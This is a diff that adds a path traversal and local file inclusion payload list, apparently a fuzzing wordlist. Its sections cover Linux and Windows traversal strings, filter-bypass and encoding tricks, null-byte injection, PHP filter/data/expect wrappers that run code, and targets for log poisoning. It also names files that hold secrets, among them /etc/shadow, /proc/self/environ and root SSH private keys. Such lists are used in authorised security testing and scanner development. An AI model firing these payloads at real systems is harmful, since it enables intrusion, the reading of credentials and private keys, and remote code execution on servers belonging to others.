@@ -1,0 +1,111 @@
+# ---------- Linux basic traversal ----------
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+../../../../../../../etc/passwd
+/etc/passwd
+etc/passwd
+
+# ---------- Non-recursive stripping bypass ----------
+....//....//....//....//etc/passwd
+....//....//....//etc/passwd
+..//..//..//..//etc/passwd
+
+# ---------- URL-encoded ----------
+..%2f..%2f..%2f..%2fetc%2fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%2e%2e/%2e%2e/%2e%2e/etc/passwd
+....%2f....%2f....%2fetc%2fpasswd
+..%5c..%5c..%5c..%5cetc%5cpasswd
+%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd
+
+# ---------- Double-encoded ----------
+..%252f..%252f..%252f..%252fetc%252fpasswd
+%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
+..%255c..%255c..%255cwindows%255cwin.ini
+
+# ---------- Null byte injection ----------
+../../../../etc/passwd%00
+../../../../etc/passwd%00.jpg
+../../../../etc/passwd%00.png
+../../../../etc/passwd%2500
+../../../../etc/passwd%2500.jpg
+
+# ---------- UTF-8 overlong encoding ----------
+..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
+..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd
+%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
+..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd
+
+# ---------- Absolute path bypass ----------
+file:///etc/passwd
+file://localhost/etc/passwd
+
+# ---------- Windows basic ----------
+..%5c..%5c..%5c..%5cwindows%5cwin.ini
+..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini
+../../../../windows/win.ini
+..%255c..%255c..%255cwindows%255cwin.ini
+%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini
+..%5c..%5c..%5c..%5cboot.ini
+../../../../boot.ini
+C:%5cwindows%5cwin.ini
+C:/windows/win.ini
+C:%5cwindows%5cwin.ini%00
+C:%5cboot.ini
+%5c%5clocalhost%5cc$%5cwindows%5cwin.ini
+..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini
+....%5c....%5c....%5c....%5cwindows%5cwin.ini
+
+# ---------- Windows sensitive ----------
+C:%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
+../../../../windows/system32/drivers/etc/hosts
+file:///c:/windows/win.ini
+
+# ---------- PHP wrappers (php://filter) ----------
+php://filter/convert.base64-encode/resource=index.php
+php://filter/convert.base64-encode/resource=../index.php
+php://filter/convert.base64-encode/resource=../../index.php
+php://filter/convert.base64-encode/resource=config.php
+php://filter/convert.base64-encode/resource=/etc/passwd
+php://filter/read=convert.base64-encode/resource=index
+php://filter/convert.base64-encode/resource=index
+php://filter/convert.iconv.utf-8.utf-16/resource=index.php
+php://filter/zlib.deflate/convert.base64-encode/resource=index.php
+php://filter/convert.base64-encode/resource=login
+
+# ---------- PHP data:// & expect:// ----------
+data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
+data://text/plain,<?php phpinfo();?>
+data:text/plain,<?php echo 'lfi-canary-1337';?>
+expect://id
+php://input
+phar://malicious.phar
+
+# ---------- Log poisoning ----------
+../../../../../../var/log/apache2/access.log
+../../../../../../var/log/apache/access.log
+../../../../../../var/log/nginx/access.log
+../../../../../../var/log/httpd/access_log
+../../../../../../var/log/auth.log
+../../../../../../var/log/syslog
+../../../../../../var/log/messages
+
+# ---------- proc / sensitive files ----------
+../../../../../../proc/self/environ
+../../../../../../proc/self/cmdline
+../../../../../../proc/self/status
+../../../../../../proc/version
+../../../../../../proc/self/fd/0
+../../../../../../etc/hostname
+../../../../../../etc/hosts
+../../../../../../etc/issue
+../../../../../../etc/group
+../../../../../../etc/shadow
+../../../../../../etc/motd
+../../../../../../etc/crontab
+../../../../../../root/.bash_history
+../../../../../../root/.ssh/id_rsa
+../../../../../../root/.ssh/authorized_keys
+../../../../../../home/user/.bash_history
+../../../../../../home/user/.ssh/id_rsa
